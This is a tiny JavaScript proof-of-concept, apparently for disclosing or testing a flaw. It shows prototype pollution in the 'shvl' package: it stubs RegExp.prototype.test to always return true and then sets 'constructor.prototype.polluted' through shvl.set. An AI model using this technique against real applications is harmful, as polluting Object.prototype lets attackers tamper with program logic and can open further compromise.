RegExp.prototype.test = () => true;
var shvl = require('shvl');
obj = {};
console.log({}.polluted);
shvl.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);